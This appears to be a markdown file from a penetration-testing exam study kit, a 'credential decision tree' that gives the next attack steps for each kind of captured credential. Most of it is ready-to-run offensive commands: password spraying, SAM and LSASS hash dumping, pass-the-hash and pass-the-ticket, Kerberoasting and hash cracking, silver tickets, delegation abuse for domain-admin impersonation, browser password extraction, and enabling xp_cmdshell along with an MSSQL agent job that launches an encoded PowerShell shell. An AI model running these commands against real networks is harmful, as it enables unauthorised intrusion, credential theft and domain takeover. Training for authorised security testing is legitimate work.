# Credential Decision Tree

## Single Source of Truth

**This is the only file that defines credential workflows.**

Every other methodology file that needs credential testing logic MUST reference this file instead of duplicating instructions.

---

## How to Use This Document

Found a credential? Find its type below. Each entry answers five questions:

- **Test first** — Immediate action. Do this NOW.
- **Test next** — After first test succeeds or fails.
- **Stop when** — Signal to move on.
- **Unlocks** — Attack paths that become available.
- **Escalation** — Privilege escalation opportunities.

---

## 1. Username Only (No Password)

| | |
|---|---|
| **Test first** | `kerbrute userenum -d DOMAIN --dc DC users.txt` — validates which names are real domain users |
| **Test next** | Password spray top patterns: `<Season><Year>!`, `<CompanyName>1`, `Welcome1` across all validated users. Start with 1 attempt per user, wait 30 min, try next password. |
| **Stop when** | 3 password patterns tried with zero hits, or account lockouts detected |
| **Unlocks** | Valid domain user credential (if spray hits). AS-REP roast targets (users without pre-auth). |
| **Escalation** | Any domain user → BloodHound → potential DA path. One valid cred unlocks the entire AD chain. |

**Commands:**
```bash
kerbrute userenum -d DOMAIN --dc DC usernames.txt
netexec smb DC -u usernames.txt -p 'Spring2025!' --continue-on-success
netexec smb DC -u usernames.txt -p 'Fall2025!' --continue-on-success
GetNPUsers -dc-ip DC DOMAIN/ -usersfile usernames.txt -format hashcat
```

---

## 2. Username + Password (Plaintext)

| | |
|---|---|
| **Test first** | Determine credential type: domain, local, or service account. `netexec smb DC -u user -p pass` — if it works against the DC, it's a domain credential. |
| **Test next** | Sweep ALL hosts on ALL protocols: `netexec smb/winrm/ssh/mssql <subnet>/24 -u user -p pass --continue-on-success`. If domain credential: BloodHound immediately. |
| **Stop when** | Credential tested against every reachable host and service. BloodHound data collected and analyzed. |
| **Unlocks** | Host access (SMB/WinRM/SSH). Domain credential → AD enumeration chain (BloodHound, Kerberoast, LDAP dump). Password spray pattern against other users. |
| **Escalation** | Domain user → BloodHound → ACL abuse → DA. Local admin → LSASS dump → domain creds. Service account → check delegation → potential DA path. |

**Commands:**
```bash
# Classify
netexec smb DC -u user -p pass

# Sweep
netexec smb <subnet>/24 -u user -p pass --continue-on-success
netexec winrm <subnet>/24 -u user -p pass --continue-on-success
netexec ssh <subnet>/24 -u user -p pass --continue-on-success
netexec mssql <subnet>/24 -u user -p pass --continue-on-success

# If domain credential
bloodhound-python -u user -p pass -d DOMAIN -ns DC -c all
GetUserSPNs -dc-ip DC DOMAIN/user:pass -request
netexec ldap DC -u user -p pass -M laps
```

---

## 3. Local Admin Credential

| | |
|---|---|
| **Test first** | Verify on originating host: `netexec smb host -u Administrator -p pass` or PTH with hash. Then `netexec smb host -u Administrator -p pass --sam` to dump local hashes. |
| **Test next** | Sweep SMB and WinRM on ALL hosts. Local admin password reuse is the #1 exam shortcut. Run in parallel: `netexec smb <subnet>/24 -u Administrator -p pass` while you enumerate the current host. |
| **Stop when** | Tested against every host. If zero reuse on first 3 random hosts, stop — LAPS or randomized passwords are in use. Move to AD-based lateral. |
| **Unlocks** | Full host control. SAM dump for local hashes. LSASS dump for domain credentials (if domain-joined). File system access. Registry access. |
| **Escalation** | LSASS dump → domain user credentials. Host is domain-joined → cached domain creds → AD foothold. SMB exec (psexec/wmiexec) → interactive access on any host with same password. |

**Commands:**
```bash
# Verify + dump SAM
netexec smb host -u Administrator -p pass
netexec smb host -u Administrator -p pass --sam

# Test reuse (fall fast: try 3 random hosts)
netexec smb 10.10.10.10 -u Administrator -p pass
netexec smb 10.10.10.11 -u Administrator -p pass
netexec smb 10.10.10.12 -u Administrator -p pass
# If all 3 fail → STOP. Move to AD attacks.

# Access
psexec.py WORKGROUP/Administrator:pass@host
wmiexec.py WORKGROUP/Administrator:pass@host
```

---

## 4. Domain Credential

| | |
|---|---|
| **Test first** | BloodHound: `bloodhound-python -u user -p pass -d DOMAIN -ns DC -c all`. Do NOTHING else until BH data is collected and loaded. |
| **Test next** | While BH loads: Kerberoast (`GetUserSPNs -request`), LDAP dump (`ldapdomaindump`), check LAPS (`netexec ldap DC -u user -p pass -M laps`), password spray same password against other domain users. |
| **Stop when** | BloodHound analyzed and either: (a) DA path found and execution started, or (b) no DA path found via BH (switch to manual AD enumeration). |
| **Unlocks** | Complete AD enumeration chain. BloodHound path identification. Kerberoast targets. ACL abuse paths. ADCS enumeration. Delegation attacks. Trust enumeration. |
| **Escalation** | BL0001 → ForceChangePassword on DA. GenericAll → add self to DA group. WriteDACL → grant DCSync. AllExtendedRights → DCSync. ADCS ESC1 → certificate as any user. Unconstrained delegation host → TGT theft. |

**Commands:**
```bash
# Mandatory: BloodHound
bloodhound-python -u user -p pass -d DOMAIN -ns DC -c all

# While BH loads
GetUserSPNs -dc-ip DC DOMAIN/user:pass -request
netexec ldap DC -u user -p pass -M laps
certipy find -u user@DOMAIN -p pass -dc-ip DC
impacket-findDelegation DOMAIN/user:pass

# Sweep
netexec smb <subnet>/24 -u DOMAIN\\user -p pass --continue-on-success
```

---

## 5. NTLM Hash

| | |
|---|---|
| **Test first** | **Pass-the-Hash immediately.** Do not wait for cracking. `psexec.py -hashes :hash user@host`, `wmiexec.py -hashes :hash user@host`, `evil-winrm -i host -u user -H hash`. Try all three — one will work. |
| **Test next** | Start hashcat in background: `hashcat -m 1000 hash.txt rockyou.txt`. While cracking runs, PTH against ALL hosts: `netexec smb <subnet>/24 -u user -H hash`. |
| **Stop when** | (a) PTH succeeds and you have a shell, OR (b) PTH fails against all hosts and hash won't crack. For (b): check if it's a domain hash (use overpass-the-hash to convert to Kerberos). |
| **Unlocks** | Interactive shell (via SMB exec/WinRM). Host control → LSASS dump → more credentials. If domain hash: full domain authentication without password. |
| **Escalation** | Local admin hash → host control → LSASS → domain creds. Domain user hash → overpass-the-hash → Kerberos TGT → AD chain. Admin hash on DC → DCSync. |

**Commands:**
```bash
# PTH (try all three)
psexec.py -hashes :hash DOMAIN/user@host
wmiexec.py -hashes :hash DOMAIN/user@host
evil-winrm -i host -u user -H hash

# Sweep
netexec smb <subnet>/24 -u user -H hash --continue-on-success
netexec winrm <subnet>/24 -u user -H hash --continue-on-success

# Crack (background)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# Overpass-the-hash (convert NTLM to Kerberos)
python3 getTGT.py DOMAIN/user -hashes :hash
export KRB5CCNAME=user.ccache
psexec.py -k DOMAIN/user@host
```

---

## 6. Kerberos Ticket (TGT or TGS)

| | |
|---|---|
| **Test first** | Determine type: TGT (user authentication) or TGS (service access). `klist` on Linux, `klist` or mimikatz `kerberos::list` on Windows. |
| **Test next** | If TGT: Pass-the-Ticket. Export to `KRB5CCNAME` and use `psexec.py -k`. If TGS (from Kerberoast): crack with `hashcat -m 13100` and use the password. |
| **Stop when** | Ticket used for access OR TGS is queued for cracking. |
| **Unlocks** | TGT → domain authentication as that user (no password needed). TGS → service access (silver ticket if you crack the service hash). |
| **Escalation** | DA's TGT → immediate DA access. Service account TGS → service password → check if service account is privileged → potential DA path. |

**Commands:**
```bash
# Pass-the-Ticket (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k DOMAIN/user@host

# Pass-the-Ticket (Windows - mimikatz)
kerberos::ptt ticket.kirbi

# Crack TGS
hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt

# Silver Ticket (if you know service hash)
impacket-ticketer -nthash SERVICE_HASH -spn service/host -domain DOMAIN user
```

---

## 7. Kerberoast Hash (TGS Ticket)

| | |
|---|---|
| **Test first** | Crack with hashcat: `hashcat -m 13100 hash.txt rockyou.txt`. This is slower than NTLM — run in background. While it runs, check if you can identify the service account name (it's in the ticket). |
| **Test next** | If cracked: test password against the service host (`netexec smb/winrm`). Also test against all other hosts. Check BloodHound for the service account's privileges. |
| **Stop when** | Cracked and password tested everywhere, OR hash won't crack with rockyou + best64.rule + d3ad0ne.rule. |
| **Unlocks** | Service account password. Service host access. Silver Ticket capability. |
| **Escalation** | Service account may be local admin on its host. Some service accounts are Domain Admins (rare but exists). Service account with constrained delegation → impersonate DA. |

**Commands:**
```bash
# Crack (background)
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# If cracked
netexec smb <service_host> -u svc_account -p cracked_pass
netexec winrm <service_host> -u svc_account -p cracked_pass

# Silver Ticket (if don't crack but need service access)
impacket-ticketer -nthash SERVICE_NT_HASH -spn SERVICE/host -domain DOMAIN user
```

---

## 8. SSH Private Key

| | |
|---|---|
| **Test first** | `chmod 600 key_file && ssh -i key_file user@host` — try it on the host you found it on. Try `root` as the user if you don't know the owner. |
| **Test next** | If the key has a passphrase, crack in background: `ssh2john key_file > hash.txt && john hash.txt --wordlist=rockyou.txt`. While cracking, try the key on other hosts with the same username. Test common usernames: root, ubuntu, admin, the hostname. |
| **Stop when** | Key works and you have a shell, or key fails on all hosts and passphrase won't crack. |
| **Unlocks** | Linux shell access. From there: Linux privesc chain, credential harvesting, domain join check, pivot deployment. |
| **Escalation** | SSH as a user → `sudo -l`, SUID, cron, capabilities — full Linux privesc chain. If key is for root → immediate root access. |

**Commands:**
```bash
# Test key
chmod 600 id_rsa
ssh -i id_rsa user@host
ssh -i id_rsa root@host

# Test on other hosts
for ip in $(cat hosts.txt); do ssh -i id_rsa -o StrictHostKeyChecking=no user@$ip whoami; done

# Crack passphrase (background)
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 9. MSSQL Credential (sa or sysadmin)

| | |
|---|---|
| **Test first** | Connect: `mssqlclient.py user:pass@target`. Enable xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`. |
| **Test next** | If xp_cmdshell works: execute `whoami`. If SYSTEM → LSASS dump target. If service account → check domain context. If xp_cmdshell blocked: try MSSQL Agent Jobs or OLE automation. |
| **Stop when** | Shell obtained OR all SQL execution methods tried and blocked. |
| **Unlocks** | RCE (via xp_cmdshell). Database access (read/write all data). Linked server access (lateral movement to other DB servers). |
| **Escalation** | xp_cmdshell → SYSTEM shell (if MSSQL runs as SYSTEM). Service account shell → check domain privileges. Linked servers → access to other databases → more credentials. |

**Commands:**
```bash
# Connect
mssqlclient.py user:pass@target

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# If xp_cmdshell blocked: Agent Jobs
EXEC msdb.dbo.sp_add_job @job_name='reverse';
EXEC msdb.dbo.sp_add_jobstep @job_name='reverse', @step_name='shell', @subsystem='CmdExec', @command='powershell -e ...';
EXEC msdb.dbo.sp_start_job @job_name='reverse';

# Enumerate linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
EXEC ('SELECT * FROM sys.servers') AT [linked_server];
```

---

## 10. Browser Credential

| | |
|---|---|
| **Test first** | Extract them. Windows admin: use `SharpChrome.exe` or mimikatz `dpapi::chrome`. Windows non-admin: copy browser profile and crack offline. Linux: `firefox_decrypt.py`. |
| **Test next** | Test each extracted credential against SMB/WinRM/SSH/web apps. Users reuse browser-saved passwords everywhere. `netexec sweep` each one. |
| **Stop when** | All extracted passwords tested against all hosts. |
| **Unlocks** | Web application access. Potentially domain credentials saved in browser. Service account passwords. Cloud console access. |
| **Escalation** | Domain credential in browser → BloodHound → DA path. Admin web app access → RCE via admin panel. Cloud console access → cloud compromise. |

**Commands:**
```bash
# Windows (admin)
SharpChrome.exe logins

# Windows (non-admin — copy profile)
copy C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data .
python3 chrome_decrypt.py Login Data

# Linux
python3 firefox_decrypt.py ~/.mozilla/firefox/*.default

# Test each credential
netexec smb <subnet>/24 -u extracted_user -p extracted_pass --continue-on-success
```

---

## 11. Service Account Credential

| | |
|---|---|
| **Test first** | Determine what service it runs. Check SPN: `setspn -T DOMAIN -Q user` or in BloodHound. Check delegation: `impacket-findDelegation DOMAIN/user:pass`. |
| **Test next** | Test credential against the service host: `netexec smb/winrm <service_host> -u svc_account -p pass`. Check if service account is local admin on its host. Check BloodHound for DA path from this account. |
| **Stop when** | Service account's privileges and access fully enumerated. |
| **Unlocks** | Service host access. Potential delegation abuse (if constrained/unconstrained). Potential DA path (if service account is privileged in BloodHound). |
| **Escalation** | Constrained delegation → `getST.py -impersonate administrator` → DA access. Unconstrained delegation host → TGT theft. Service account in privileged group → direct lateral. |

**Commands:**
```bash
# Check delegation
impacket-findDelegation DOMAIN/user:pass

# Test host
netexec smb <service_host> -u DOMAIN\\svc_account -p pass

# Constrained delegation abuse (if applicable)
impacket-getST -spn cifs/target.DOMAIN.local DOMAIN/svc_account:pass -impersonate administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k DOMAIN/administrator@target.DOMAIN.local
```

---

## Quick Reference Card

```
FOUND THIS?              TEST FIRST              TEST NEXT              STOP WHEN
───────────────────────  ──────────────────────  ─────────────────────  ─────────────────────
Username only            Kerbrute enum           Spray 3 passwords      3 patterns, no hits
Password                 Classify (domain?)      Sweep + BloodHound     BH analyzed
Local admin              Verify + SAM dump       Sweep 3 hosts          All fail = LAPS
Domain cred              BloodHound NOW          Kerberoast + spray     BH analyzed
NTLM hash                PTH NOW                 Crack (bg) + sweep     Shell or no path
Kerberos ticket          PTT / identify type     Use or crack           Used or queued
Kerberoast hash          Crack (bg)              Check svc privs        Cracked or dead
SSH key                  Try SSH host            Crack (bg) + try all   Shell or dead
MSSQL cred               xp_cmdshell             Agent Jobs fallback    Shell or blocked
Browser cred             Extract all             netexec sweep each     All tested
Service account          Check delegation        Test host + BH         Fully enumerated
```

---

## Decision Flow: What to Do After Every Credential

```
CREDENTIAL → CLASSIFY → TEST → DOCUMENT → NEXT

[CLASSIFY]
  ├── Is it a domain credential? → BloodHound immediately
  ├── Is it a local admin? → SAM dump + test reuse
  ├── Is it a service account? → Check delegation + SPN
  └── Is it a hash? → PTH if NTLM, crack if NetNLMv2/Kerberos

[TEST] (in order)
  1. Originating host — ALL services
  2. ALL other hosts — netexec sweep (SMB, WinRM, SSH, MSSQL)
  3. Password spray (same password, different users)
  4. Password variations (if cracked)

[DOCUMENT]
  → Credential tracker: username, password/hash, domain, source, working hosts/services

[NEXT]
  → Did it work on any host? → Post-exploitation on that host (Module 13)
  → Is it a domain credential? → AD attack chain (Module 11)
  → Did it fail everywhere? → Return to enumeration
```

---

## Files That Reference This Document

All other methodology files should redirect credential workflows here.

Current files with credential workflow duplication:

| File | Action |
|------|--------|
| `modules/06-password-attacks.md` | Keep cracking technique reference. Remove credential testing flow — reference this file. |
| `modules/11-active-directory.md` | Keep AD-specific commands. Reference this file for credential handling. |
| `modules/99-attack-graph.md` | Remove "Valid Credential Obtained" and "NT Hash Obtained" sections — reference this file. |
| `modules/13-post-exploitation.md` | Keep harvesting techniques. Reference this file for what to do with found creds. |
| `exam/exam-dashboard.md` | Remove "What Do I Do If I Find a Password/Hash?" sections — reference this file. |
| `exam/loot-priority-framework.md` | Keep loot tier definitions. Reference this file for credential actions. |
| `exam/exam-execution-playbook.md` | Remove credential handling steps — reference this file. |
| `operator/COMMAND_CENTER.md` | Remove credential commands — reference this file. |
| `battlecards/Password-Attacks.md` | Remove credential flow — reference this file. |

## Cross-References
- Post-exploitation harvesting → [Module 13](13-post-exploitation.md)
- Cracking techniques → [Module 06](06-password-attacks.md)
- AD attack chain → [Module 11](11-active-directory.md)
- Lateral movement → [Module 12](12-lateral-pivot.md)
- Credential tracking → [CREDENTIAL_TRACKING_GUIDE.md](CREDENTIAL_TRACKING_GUIDE.md)
- Attack prioritization → [attack-priority.md](attack-priority.md)
